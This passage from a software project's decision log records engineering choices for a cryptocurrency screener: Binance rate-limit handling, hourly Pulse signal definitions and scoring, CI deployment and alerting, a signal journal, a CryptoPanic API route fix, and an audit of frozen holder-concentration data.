  `volume_usd`. `KEEP_WHEN_NULL` protects it, so a kline re-fetch without the
  field cannot blank it. A CoinGecko row never carries the column, and
  `PREFERRED_SOURCE` already keeps a kline row whole against it.
  `INCREMENTAL_DAYS = 7` fills the flow window after one daily run.
- **Weight fix found on the way.** Binance charges USD-M klines by `limit` in
  half-open bands: [1,100) = 1, [100,500) = 2, [500,1000] = 5 (ccxt:
  `byLimit [[99,1],[499,2],[1000,5],[10000,10]]`). `PAGE_LIMIT = 500` cost
  5, not the 2 the header claimed. It is now 499 for backfills, and daily
  incremental requests use `limit = 99` (weight 1). Weight is charged on
  `limit`, not on bars returned, so the daily 528-symbol pass drops from
  about 2,640 weight to about 528.
- **Published.**
  - `latest.json` rows: `blocks.momentum`, `coverage`, `score_version`.
  - `latest.json` top level: `score_version` and `live_blocks`. The live
    blocks are derived exactly from the stored rows by `live_blocks_for_run`.
  - Asset JSON `layer2`: `coverage`, `score_version`, `blocks.momentum`.
  - The daily markdown adds Mom and Cov columns.
  - `block_correlation_report` and the backtest's per-block attribution
    include momentum.

**Consequences.**

- Momentum (continuation) and drawdown (reversal) deliberately pull in
  opposite directions. The literature supports both at different horizons,
  and after 30 days `block_correlation_report` and the journal settle it.
- Per plan §7's kill criterion, if the Pulse top decile fails to beat its
  control after 200 events, this block's weight goes to 0 under a new
  `score_version`.
- Until one daily run has written `taker_buy_usd`, `flow_7d` is unmeasured
  for everyone and dark (D-075). The price metrics are live at once from
  the existing kline history.

**Evidence.** `tests/test_gem_v2.py` covers:
- each metric on synthetic `price_daily` rows (`TestMomentumFeatures`),
  including forming-bar exclusion, a stale series, missing taker data giving
  no flow, the 60-bar trend minimum, a young listing, and a flat series;
- the loader's `source` and date bounds (`TestMomentumLoader`);
- missing taker data earning 0 rather than a renormalised score
  (`TestMomentumBlock`);
- persistence of `score_momentum`, `coverage` and `score_version`;
- kline index 10, write-path protection and request limits
  (`TestTakerBuyCollection`);
- the published names (`TestPublishedContract`).

## D-078 — Pulse market data: 1H bars, OI and funding cut at `as_of`, stored against a cursor

**Date:** 2026-09-19 · **Status:** accepted

Pulse (docs/PLAN_ACTIVE_SCREENER.md section 5.1) needs, every hour, three
series for each Layer 1 survivor plus the benchmark: 1H klines, 1H open
interest and settled funding. `src/pulse/data.py` fetches them, cuts them at
`as_of` and stores what is new. It returns a `MarketWindow` exactly as
`src/pulse/contract.py` pins it.

**Endpoints.** All three are on the website host (D-070):

| Path | Params | Metered by |
|---|---|---|
| `/fapi/v1/klines` | `interval=1h, limit=499, endTime=as_of−1ms` | the 2,400-weight minute (`binance_futures`) |
| `/futures/data/openInterestHist` | `period=1h, limit=500, endTime=as_of` | its own IP limit, 1,000 / 5 min (`binance_futures_data: 180`/min) |
| `/fapi/v1/fundingRate` | `limit=100, endTime=as_of` | its own IP limit, 500 / 5 min shared with fundingInfo (`binance_funding: 90`/min) |

**What was measured live on 2026-09-19** (read-only, public):

- **Kline weight.** Binance documents `limit` [100, 500) as weight 2 and
  [500, 1000] as weight 5. The `x-mbx-used-weight-1m` header billed 500 at 2
  and 1000 at 5. `klines_limit` is **499**, which is weight 2 under either
  reading and costs one bar (20.8 days instead of 20.8 days + 1h).
- **Kline `endTime` filters on open time.** With `endTime = as_of`, the bar
  still forming at `as_of` comes back. With `as_of − 1ms`, it does not. The
  parser also drops any bar with open + 1h > as_of, so a replay can never
  see a partial high, low or volume.
- **An OI row stamped T is the open interest at the instant T.** It is not
  an aggregate over the hour. The 1h row at T equals the 5m row at T, on
  BTCUSDT and ONTUSDT, for four consecutive hours. So `ts ≤ as_of` is the
  honest cut, and the row at `as_of` itself is visible. By 15:3x UTC, the
  15:00 row was already published.
- **Funding stamps have jitter.** `fundingTime` came back as
  08:00:00.**002**. Binance's own `endTime=08:00:00.000` still returned it.
  Stamps are floored to the whole second and kept when ≤ as_of.
- **Array positions:** 0 open time, 1 to 4 OHLC, 5 base volume, 6 close
  time, 7 quote volume, 8 trades, 9 taker-buy base, 10 taker-buy quote. A
  bar is refused if it has fewer than 11 fields, does not open on the hour,
  or does not close 1ms before the next hour. It is also refused if any
  field is unreadable. A NaN taker-buy inside a sum would bias flow rather
  than show as missing.
- **Ten symbols, as_of 15:00.** Each returned 499 closed bars, the last
  opening 14:00. Mean taker-buy / quote volume was 0.48 to 0.50 (range 0.14
  to 0.81), and every symbol had 500 OI rows ending at 15:00. oi_contracts ×
  close / oi_usd came to 1.000 on every symbol, 1000PEPE included.

**1000-prefixed contracts** are de-multiplied the way `klines.py` does it for
`price_daily`. Prices are divided by the multiplier, OI contracts are
multiplied back into tokens, and USDT amounts are left alone. `bar_1h.close`
is then per token, like every other price in the database. The multiplier
and symbol come from the newest `universe_snapshot` on or before the as_of
day. That snapshot already resolves collisions (D-046), and the unmultiplied
contract is preferred as in `screening.pipeline`.

**Who is fetched.** The survivors are the `passed = 1` rows of the newest
`layer1_result` run dated on or before the as_of day, plus
`pulse.benchmark_asset`. Both lookups use `ORDER BY date DESC LIMIT 1` on
the date index rather than `MAX()` with a second predicate, which can scan.
Turso meters reads.

**Storage.** One query reads every `series_cursor` row for `bar_1h` and
`oi_1h`. Only rows after an asset's cursor are upserted, and then the cursor
advances. There is never a `MAX()` over `bar_1h`. Two cases write the whole
fetched window:

- the asset has no cursor, which is the ~21-day backfill, free on first
  sight;
- the cursor was recorded under another contract symbol.

A cursor never moves backwards under the same symbol, so replaying a past
hour writes nothing. Cursors are written last. A crash before them only
means the next run rewrites the same rows, which the upsert makes harmless.

Steady state per asset per hour is 1 bar row, 1 OI row and 2 cursor rows,
plus 3 `table_stats` bumps per run. At ~161 assets that is about 650 writes
an hour, ~0.47M a month, inside the plan's +0.6M. Funding is not stored,
because `derivatives_snapshot` already records it hourly.

**Failure rules** (D-051, D-052):

- **klines failed for an asset.** The asset goes into
  `window.fetch_errors` (`"klines: …"`) with no bars, OI or funding, stays
  in `window.survivors`, and the run is partial. If more than 20% of fetched
  assets fail, the run is failed.
- **OI or funding failed for an asset.** This is a `warn()`, so the run is
  partial. The asset is left out of `window.oi` / `window.funding` but keeps
  its bars, and it is *not* in `fetch_errors`. Features score what was
  measured (D-075). Above 20% there is an extra `pulse_*_mostly_unavailable`
  warning, but the run does not fail: Pulse can still score without OI.
- **A survivor with no TRADING Binance perp** goes into `fetch_errors` and
  gets a warning.
- **418.** `IPBannedError` escapes the `TaskGroup`, which cancels every
  sibling task, and the run fails. The only calls that still reach Binance
  are the ≤ 3 × `concurrency` already in flight.
- **After a failed run**, `collector.window` is `None`. After success or
  partial, it is the `MarketWindow`.

**Not in any tier.** `binance_pulse` is in `registry.COLLECTORS`, so
`collect binance_pulse` works by hand. `src/pulse/run.py` runs it inside
`collect-hourly` and reads `.window`.

**Watch for.**

- **Funding history is short.** `funding_limit: 100` is 33 days of an 8h
  symbol but 16.7 days of a 4h one (ONT) and 4 days of a 1h one. R1's "own
  90 days" percentile cannot come from this window alone.
- **The OI row for `as_of` may not be published yet.** The plan runs at :03.
  A missing row is simply absent this hour, and the cursor picks it up next
  hour. An OI row that appears only after a *later* row was written would be
  skipped by the cursor. This was not observed.
- **Proxied-path limits are unverified from CI.** The `/futures/data` and
  `fundingRate` paths were verified reachable on `www.binance.com` from a
  laptop only. D-070's CI table covered `/fapi/v1/*`.

## D-079 — Pulse signals: definitions, windows and weights (`pulse-v1`)

**Date:** 2026-09-19 · **Status:** accepted · **Code:** `src/pulse/features.py`, `structure.py`, `score.py`

Pulse is the hourly clock: survivors of Layer 1 only, horizon 4–72 hours,
scored separately from the Gem score (docs/PLAN_ACTIVE_SCREENER.md §2, §5).
This entry pins what every number means, so `pulse-v1` can be journalled
and compared later. Changing anything below needs a new D-number and a new
`score_version`.

### Time

- **Closed bars only.** `data.py` filters on the way in. `compute_features`
  strips again, and logs `pulse_lookahead_stripped`, any 1H bar with
  open + 1h > `as_of` and any OI or funding stamp > `as_of`. The test
  appends a still-open bar, future bars, future OI and future funding, and
  asserts the frame is unchanged.
- **Time, not rows** (the D-060 lesson). Bars sit on an hourly grid that ends
  at `floor(as_of) − 1h`, and "24h ago" means 24 slots back. A gap stays NaN,
  never a silently shorter window. A series that stopped printing measures
  nothing current: its returns and last-bar thrust are NaN.
- **4H bars** are resampled from 1H bars, aligned to 00/04/…/20 UTC and
  stamped with their open time. A bucket is kept only if all four of its 1H
  bars exist, so a bucket that is still forming or has a hole is dropped.
  `thrust_4h` needs the newest complete bucket to be the expected one.
- A windowed sum or std needs at least 75% of its bars.

### Features

| ID | Definition |
|---|---|
| F1 `flow_4h`, `flow_24h` | (2·Σ taker_buy_quote − Σ quote_volume) / Σ quote_volume over the last 4 / 24 grid bars. Range [−1, 1] |
| F1 `flow_24h_z` | the current rolling-24h flow against the previous `zscore_lookback_days`×24 hourly values of the same series (current value excluded), ddof 1; needs ≥ 72 values |
| F2 `thrust_1h`, `thrust_4h` | log(volume of the last closed bar / median volume of the prior `thrust_baseline_bars` bars) × sign(close − open) of that bar |
| F3 `vamom_24h`, `vamom_7d` | simple return over 24 / 168 h ÷ (std of the window's 1H log returns × √n) |
| F3 `vamom_24h_z` | the current rolling vamom_24h against its own history, same rule as flow_24h_z |
| F4 `oi_chg_4h`, `oi_chg_24h` | fractional change in `oi_contracts`. An OI reading may be carried forward 1 hour, no more |
| F4 quadrants | D-074 table |
| F5 / F6 `state_4h`, `state_1h` | see Structure |
| `oi24_own_pctile`, `funding_own_pctile` | share (0–100) of the asset's own past values at or below the current one. OI: 24h changes over the lookback, ≥ 72 values. Funding: every settlement supplied, ≥ 30 values, because 8-hourly settlements over 20 days are only 60 points |

The own-history sigma used for "flat" and "no move" is the std of 1H log
returns over the lookback, × √hours. It comes from the asset's own history,
not the same window, because a quiet day would otherwise define its own
quietness away.

### Structure (F5 4H, F6 1H)

These use the same geometry as Layer 3's detector, restated pure and
parameterised by `PulseStructure`:
- a pivot has `swing_window_bars` strictly lower (or higher) bars on each side;
- a line is valid only if no close crossed it between its endpoints;
- among valid lines, most touches wins, then most recent;
- a break is a close beyond line × (1 ± tolerance).

Layer 3 itself is not imported: it reads `thresholds.layer3`, assumes daily
dates, and imports the database layer.

- **bull_break**: a descending line through ≥ `trendline_min_touches` swing
  highs, inside the last `lookback_bars`, first broken by a close within
  `max_bars_since_break` bars, **and the newest close is still above it**. A
  break that closed back inside the line has failed, and a score cannot
  "leave it to the reader" the way Layer 3 can. bear_break is the mirror,
  through ascending swing lows. If both are live, the more recent one wins,
  and on the same bar the bearish one wins. `invalidation` is the line's value
  at the newest bar.
- **bull_trend**: EMA fast > slow on each of the last 3 bars, both EMAs higher
  than 3 bars ago, and close > EMA fast. bear_trend is the mirror, and
  anything else is neutral. The stack must hold for the whole slope window:
  without that, a flat choppy series flipped the stack every bar and read as
  a trend (found by test). `bars_since` counts bars since the stack last
  flipped. It is a lower bound when the stack never flipped after warm-up.
- **Too little history raises.** Neutral scores 50, and missing data must
  score nothing (D-075). The floor is `ema_slow + ema_fast` bars (70 at
  20/50), about 11.7 days of 1H data for 4H. An asset with the minimum week of
  1H bars therefore has no `state_4h` yet.

### Exclusions and flags

- `thin_book`: 24h quote volume < `min_quote_volume_24h_usd`, or no volume at
  all in the last 24h.
- `insufficient_history`: fewer than `min_bars_1h` closed bars.
- Both exclude the asset: it keeps a row with a NaN score and NaN rank, and
  never enters a percentile pool.
- R1 and R2: see D-074.

### Score

Each component is 0–100. Percentile components are ranked cross-sectionally
**within the hour's scored set** (`cross_sectional_percentile`, reused from
Layer 2).

| Component | Weight | Inside |
|---|---:|---|
| flow | 25 | pct(flow_24h) ×1 + pct(flow_4h) × `flow_4h_relative_weight` (0.5) |
| structure_4h | 20 | STATE_SCORE[state_4h] |
| momentum | 20 | pct(vamom_24h) ×1 + pct(vamom_7d) ×1 |
| thrust | 15 | pct(thrust_4h) ×1 + pct(thrust_1h) ×0.5. The 1H spike is the noisier reading of the same thing |
| oi_confirm | 10 | OI_QUADRANT_SCORE of the 24H quadrant only |
| structure_1h | 10 | STATE_SCORE[state_1h] |

**Missing scores nothing (D-075).**
- A sub-metric, or a component, is *live* when it is measured for at least
  `live_min_assets` scored assets. A live one the asset lacks counts as 0;
  its weight is not redistributed.
- A dark one drops out for everyone.
- `coverage` = Σ weight × (measured sub-weight ÷ live sub-weight) ÷ live
  weight.
- If nothing is live, nothing is scored.

Composite = weighted mean over the live components × the R1/R2 multipliers,
clipped to 0–100. Rank 1 is best, with ties broken by asset name.
**ALIGNED** = Gem rank ≤ 25, score ≥ 70, state_4h in {bull_break,
bull_trend}, and no R-flag.

### Sanity run (2026-09-19 15:00 UTC, live Binance 1H klines, no OI or funding)

| Asset | Score | 4H state | Note |
|---|---:|---|---|
| AVAX | 76.9 | bull_trend | +15.8% over 24h, thrust percentile 100 |
| BTC | 73.9 | bull_break (5 bars ago) | strongest flow |
| ETH | 73.9 | bull_break (5 bars ago) | |
| LINK | 61.0 | bull_trend | |
| DOGE | 58.1 | neutral | |
| SOL | 57.8 | bull_trend | |
| NEAR | 42.9 | bull_trend | weakest flow |
| ONT | — | — | excluded, thin_book ($2.2M in 24h) |

- `oi_confirm` was dark for everyone and dropped out, so coverage was 1.0 for
  all scored assets.
- The feed's still-open 15:00 bar was stripped for all eight symbols.
- compute_features takes about 0.1 s per asset.

## D-080 — Pulse runs hourly as its own job, redeploys the site without a commit, and alerts on state changes only

**Date:** 2026-09-19 · **Status:** accepted · **Implements PLAN_ACTIVE_SCREENER section 6**

**The hour scored.** `pulse run` scores `hour_floor(now)`: the newest hour whose
1H bar has closed. The cron slot (currently :25) changes only how old the bars
are, never which hour is scored, so a late or duplicate trigger re-scores the
same hour and the `pulse_result` upsert makes it a no-op. If the collector
fails, nothing is written to `pulse_result` and the command exits 1: a partial
hour stamped as current is worse than a missing one, which the page reports as
unavailable. `collect-hourly` never runs `init-db`, so the run creates the Pulse
tables itself when one is missing (one `sqlite_master` read per run).

**A job, not a step.** In `collect-hourly.yml` Pulse is a separate `pulse` job
with no `needs`:

* a step after `Collect hourly tier` would never run while any hourly collector
  fails (CryptoPanic has returned 404 every hour, PLAN 0.4), and Pulse fetches
  its own bars, OI and funding;
* `continue-on-error` on a step would keep `HEALTHCHECK_HOURLY` green through a
  dead Pulse. So each check means one thing: `HEALTHCHECK_HOURLY` = the collect
  tier, the new optional `HEALTHCHECK_PULSE` = an hour scored,
  `HEALTHCHECK_SITE` = the Pages deploy. The trigger-lag row is untouched.

**Deploy without a commit.** A `site` job (`needs: pulse`, `if: !cancelled()`)
calls `build-site.yml` as a reusable workflow (`workflow_call`,
`secrets: inherit`, `pages: write`, `id-token: write`). `build-site` bakes
`data/public/pulse.json` from the database before `npm run build`, so the file
is in `web/dist` and covered by the bundle secret scan. It is gitignored:
`publish` commits `data/public/**` and 24 data commits a day would bloat a
permanent history. The daily chain is unchanged, and it bakes the file too, so a
daily deploy never ships without it. `workflow_call` adds no `workflow_run`
level (D-045). The build job's guard already admits it, because inside a called
workflow `github.event_name` is the caller's (`workflow_dispatch`).

* The bake step is `continue-on-error`, so a Pulse problem never blocks the Gem
  site. The bake writes status `unavailable` whenever the database cannot be
  read or the newest hour is over 3h old, and exits 1 only on a real error. The
  page tells the truth and the red step still shows.
* The hourly call checks out the newest `main` (`checkout_ref: main`), not the
  dispatch SHA. A run dispatched just before the daily data commit would
  otherwise redeploy yesterday's Gem files over today's. The input reaches
  `actions/checkout` via job `env:`, which keeps ci.yml's interpolation guard.
* `timeout-minutes` is rejected by GitHub on a job that `uses:` a workflow. The
  test now exempts that job shape and checks the called jobs instead.

**Alerts: state changes only.** One batched Telegram message per hour, for:
(a) an asset newly ALIGNED; (b) `state_4h` newly `bear_break` on an asset with
Gem rank ≤ `alert_bear_break_gem_top`. Both are measured against the previous
scored hour, and only when that hour is at most 3h old. With no baseline there
is no change to announce, so a cold start is silent. Nothing like "still
bullish" is ever sent.

* `pulse_alert` dedups the same asset and kind within 24h.
  `alert_max_per_day` caps rows per UTC day, counting failed deliveries too, so
  a broken bot cannot become a retry storm when it recovers.
* When the cap bites, bear breaks go first: a risk warning is the alert a reader
  loses money by missing.
* Unset secrets skip quietly and record nothing. Recording would dedup the first
  configured hour against alerts nobody received.
* A delivery failure records `delivered = 0` and never fails the run. Delivery
  reuses `src/report/telegram.py`, which never raises and never logs the token.

## D-081 — The Pulse journal: events, a per-hour control, entry at the next bar's open

**Date:** 2026-09-19 · **Status:** accepted · **Implements PLAN_ACTIVE_SCREENER section 7 (measurement only)**

The daily journal's rules carry over unchanged (append-only, a random control,
median and mean, excursions). What is specific to the hourly clock:

**What gets an entry.** An asset that ENTERS the Pulse top `journal_top_n`
(`trigger = 'top10'`) or ALIGNED (`'aligned'`) compared with the previous scored
hour. Staying in is not an event. The previous hour must be at most 3h old;
otherwise the hour writes nothing and becomes the new baseline. After an outage,
"entered" would otherwise mean "entered at some point during the gap and was
still there", which selects on persistence. An asset that enters both in one
hour gets one entry per trigger, and the report never mixes triggers.

**The control.** One per entry-hour, drawn from that hour's scored survivors
that did not trigger (thin-book and insufficient-history assets are excluded
from both sides). It is seeded from the hour, and its `entry_id` is per HOUR,
not per asset, so a re-run whose pool changed cannot add a second control (the
D-062 lesson). Signal ids are `(hour, asset, trigger)` hashes. Everything is
written through `upsert`, which is INSERT OR IGNORE on these APPEND_ONLY
tables, and the DB triggers refuse UPDATE and DELETE on the journal and DELETE
on returns.

**Entry price.** The signal hour `ts` is the hour the score describes (bars
closed by `ts`). The run lands minutes later (:25 today), so the bar that opens
AT `ts` has printed its open before the signal existed. The entry is therefore
the OPEN of the bar opening at `ts + 1h`: the first price anyone could trade
after the signal, at any cron minute. The exit is the close of the bar ending at
entry + h. `max_favourable` and `max_adverse` use the highs and lows of every
bar in between. `return_vs_btc` subtracts BTC over the same bars, from
`bar_1h`. A return is written only when all h bars exist, with contiguous open
times, and BTC's entry and exit bars exist too. Otherwise it stays pending.

**Bounded reads.** Each run backfills horizons that have fallen due within the
last 72h (`BACKFILL_GRACE`), using the `ts_signal_utc` index. Without that bound
the hourly pending scan would grow with the whole journal. An entry still
missing bars 72h after it fell due is never filled. That is an outage of ours,
and it is logged rather than guessed.

**Evaluation, not enforcement.** `pulse report` groups by `score_version`, then
trigger, then horizon. It shows n, median and mean (raw and vs BTC), hit rate
vs BTC, excursions, and the median and mean difference against that version's
controls. It has no kill logic: it never zeroes a weight or relabels Pulse.
Section 7's pre-registered criterion (200 events; the top decile must beat
control on the 24h median by more than costs) is for the owner to read off
this report.

**Known limits, stated before any data.**
* Entries overlap: an asset flapping around rank 10 re-enters, and its horizons
  overlap. n counts events, not independent observations.
* A perp delisted inside the horizon stays pending, then drops out after the
  grace window. That is rare for an L1 survivor, but it is survivorship in the
  direction that flatters Pulse. The daily journal's delisted exit (D-061) is
  not yet mirrored here.

## D-082 — The CryptoPanic 404 is a removed plan route, not a bad key

**Date:** 2026-09-19 · **Status:** accepted

`news` has fetched `https://cryptopanic.com/api/developer/v2/posts/?auth_token=…`
every hour and got `404` every hour. Run 35434649554 (collect-hourly,
2026-09-19T09:26:13Z):

```
HTTP Request: GET https://cryptopanic.com/api/developer/v2/posts/?***redacted*** "HTTP/1.1 404 Not Found"
[warning ] cryptopanic_unavailable  error='HTTP 404 from https://cryptopanic.com/api/developer/v2/posts/'
```

The token IS reaching the job (D-067 holds: `collect-hourly.yml` passes
`CRYPTOPANIC_AUTH_TOKEN`, GitHub masks it as `***`, and `Secrets` reads it
case-insensitively as `cryptopanic_auth_token`). Redaction also holds: the
query string never left the runner in a log field.

**Cause.** The API is plan-scoped — `/api/<plan>/v2/` — and the free Developer
plan was discontinued in early 2026, *with its route removed*. Probed keyless
on 2026-09-19 (a missing route answers before authentication, so the shapes are
diagnostic on their own):

| path | keyless response |
|---|---|
| `/api/developer/v2/posts/` | `404`, an HTML page |
| `/api/growth/v2/posts/` | `400 {"status":"api_error","info":"Missing auth_token parameter"}` |
| `/api/enterprise/v2/posts/` | `400`, the same |
| `/api/{free,pro,basic,starter,business,…}/v2/posts/` | `404` |
| `/api/growth/v2/posts/?auth_token=<invalid>` | `400 {"status":"api_error","info":"Token not found"}` |

So this was never a key problem and never a transient one: `/api/developer/v2`
has no route left to serve. Sources: CryptoPanic's own responses above;
`https://dlthub.com/context/source/cryptopanic` ("the free Developer plan was
discontinued in early 2026", base URL `https://cryptopanic.com/api/API_PLAN/v2/`);
`https://github.com/tigusigalpa/cryptopanic-go` ("The free Developer API plan
was discontinued"). This closes the open question in API_DEVIATIONS.md ("check
the account page, not the docs").

**Decision.**

1. `endpoints.cryptopanic` moves to `https://cryptopanic.com/api/growth/v2`,
   the lowest plan whose route still exists. The plan segment is config, so
   an Enterprise key is a one-line change.
2. `public=true` is sent with the token: the non-personalised feed is the
   documented mode for an application.
3. A failure now says which failure it is, instead of one generic warning:
   `cryptopanic_endpoint_not_found` (404 — the plan segment has no route),
   `cryptopanic_auth_rejected` (400/401/403 — the route refused the key; note
   that CryptoPanic answers an unknown key with 400, not 401), and
   `cryptopanic_unavailable` for anything else. Each carries the redacted
   endpoint and an `action` field. `base.redact_url` and `scrub_secrets` are
   applied on both paths, so no message can carry the token.
4. RSS is unchanged and remains the fallback. It is worth being explicit that
   `news_item` was **not** empty: the same run wrote 75 RSS rows. What was
   missing was CryptoPanic's contribution, and — because CryptoPanic carries a
   real `published_at` — nothing about the lag measurement was lost either.

**What this does not do.** It cannot produce a successful fetch by itself. The
account needs a plan whose route exists. Until then the hourly log carries one
actionable line per hour instead of a silent 404, and the verification is one
command the owner can run:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  'https://cryptopanic.com/api/growth/v2/posts/?auth_token=YOUR_TOKEN&public=true'
# 200 -> the plan matches the key; the collector will fill news_item
# 400 -> "Token not found" or a plan mismatch; check the plan on the account page
# 404 -> the plan segment in endpoints.cryptopanic has no route
```

If no paid plan is wanted, unset `CRYPTOPANIC_AUTH_TOKEN`: the collector then
logs `cryptopanic_skipped` once and runs on RSS alone, with no hourly warning.

**Tests.** `tests/test_news_cryptopanic.py` drives success, 404, 400/401/403, a
network error and a malformed payload through an `httpx.MockTransport`, asserts
the token appears in no warning, and pins that the shipped endpoint is not the
removed `developer` route.

## D-083 — The 100% holder readings are a frozen source, not a formula fault

**Date:** 2026-09-19 · **Status:** accepted

On the 2026-09-19 screen, 261 of 526 assets failed `L1_HOLDER_CONC` and 34 of
them read ≥ 95%, twelve at exactly 100%. Two causes were suspected: the
`kept / (1 − excluded)` formula, and unlabelled exchange wallets counting as
whales. The audit was run on the committed public JSON plus live GoPlus reads
and public explorers — no database. Every published value reproduced from a
live read, so the audit is measuring the same thing the screen measured.

**The formula is not the cause, and the arithmetic says why.** Let K be the
kept top-10 share, E the excluded share and T everything held outside the top
10. Then `1 − E = K + T`, so

    effective = K / (1 − E) = K / (K + T)

The denominator is not a lever: moving a holder into the excluded set moves its
share out of K and leaves T alone, so an exclusion can only *lower* the result.
What drives it to 100% is **T → 0**: the visible top 10 holding essentially all
supply. SFP is the clean example (Ethereum, 831 holders, GoPlus agreeing with
Blockscout's 827): raw top-10 99.93%, T = 0.07%, E = 60.8% (three tagged
exchange wallets), K = 39.1%, giving 99.82%. That is a real reading. One
untagged EOA with 4 transactions holds 34.8% of this chain's supply
(`https://etherscan.io/address/0x7c7dd26c3fd211b53888daf7f8cf0ade9be2ef3f`).
The check is doing its job.

**The real cause of the 100% readings: GoPlus serves a frozen holder list.**
For twelve assets the whole list is 1–6 holders, which covers the supply by
construction and therefore reads 100% whatever the formula. Checked against
Blockscout the same day:

| asset | GoPlus holders | live holders | live raw top-10 |
|---|---:|---:|---:|
| AZTEC | 2 | 14,913 | **36.4%** |
| ENSO | 3 | 5,667 | **42.7%** |
| SENT | 29 | 3,668 | 82.8% |
| BASED | 1 | 3,739 | 83.9% |
| BILL | 1 | 1,617 | 90.6% |
| ROBO | 1 | 18,570 | 92.0% |
| POWER | 1 | 1,459 | 92.0% |
| ERA | 2 | 18,948 | 93.2% |
| BSB | 1 | 25,761 | 96.3% |
| DOS | 1 | 3,003 | 97.0% |
| HEMI | 1 | 1,757 | 99.5% |
| AT (BSC), ZEST (BSC) | 6, 1 | no Blockscout instance | — |

AZTEC and ENSO were disqualified at 100% while their live top 10 is 36% and
43%: well under the 60% threshold. Lists that GoPlus reports accurately sit far
higher (Q 203 against 205, JCT 520 against 515, RIVER 3,701 against 3,713).

**Decision.**

1. **A holder list shorter than `holders.min_goplus_holder_count` (50) is not a
   measurement.** The row is written with `top10_share = NULL` and
   `data_quality = 'stale_holder_list'`, keeping `top10_share_raw` for the
   audit trail. Layer 1 then fails the asset as `data_unavailable`, stating the
   reason. **The kill switch is not weakened**: every one of the thirteen
   affected assets still fails, and an unmeasured asset can never pass. What
   changes is that the screen stops publishing 100% as if it were a fact.
2. **A non-excluded float below `holders.min_measurable_float` (0.05) is not
   judged** (`insufficient_float`, also a `data_unavailable` FAIL). `K/(K+T)`
   over a sliver reads any ordinary wallet as control of the token. No audited
   asset was near this bound — the smallest float was SFP's 39.2% — so it
   changes nothing today and exists so the sliver case cannot be silently
   scored later.
3. **Five sourced exchange wallets are added to `excluded_addresses.yaml`**,
   each with its explorer tag URL: Bitget 35 on Ethereum (kept in NAORIS's top
   10 at 2.30%, already excluded on BSC), Binance 73 on Base (MIRA, 2.46%),
   Binance: Withdrawals 7 and Indodax 3 on BSC (EDEN, 5.05% and 1.38%), and
   Gate Deposit on Bitlayer (BTR, 1.40%).

**The exchange-wallet hypothesis was mostly not supported.** Every non-excluded
top holder ≥ 1% across the 34 assets was checked on Etherscan, BaseScan or
BscScan. Only five carried an exchange tag (above). The rest are untagged
vesting contracts, Safes, treasuries and EOAs with a handful of transactions —
i.e. the one-party pattern the check exists for (RAVE: 9 wallets, ~95%). Those
five exclusions move the affected assets by 0.2–2 points; none changes a
verdict.

**Before and after, on the 34 assets failing at ≥ 95%:** 13 become
`FAIL (data_unavailable: frozen, too-short holder list)`, 21 keep a numeric
reading within ±0.02 of what was published, and **all 34 still fail**. Coverage
for the check falls from 65.2% to roughly 63%, far above the 20% floor that
would darken it.

**Limits, recorded rather than hidden.**
- Solana readings (WET, SONIC) are token accounts, not owners, and exchange
  accounts there are not labelled by any free source we use.
- BscScan and Snowtrace block automated reads, so BSC and Avalanche contract
  holders could not be name-checked; BSC EOAs were checked on Etherscan under
  the existing rule that an EOA is the same owner on every EVM chain.
- Some assets are measured on a chain that holds only part of their supply
  (SFP: 200M of a 500M total on Ethereum). The reading is honest about that
  chain and is not the whole token.

**Next step, not taken here.** Blockscout already gives an accurate holder list
on Ethereum and Base and is already called for contract names. Using it as a
fallback when GoPlus is frozen would turn thirteen `data_unavailable` results
back into measurements — and, on today's data, would likely clear AZTEC and
ENSO. That is a new source path and belongs in its own decision.

**Tests.** `tests/test_holder_audit.py` pins the identity
`K/(1−E) = K/(K+T)`, that an exclusion can only lower the share, the AZTEC
frozen list (100% without the guard, unmeasured with it), the SFP reading
(still 99.82%, still a fail), the tiny-float guard, a RAVE-shaped token still
failing, the Layer 1 reasons, and that every curated address carries a label, a
category, a source URL and a date.
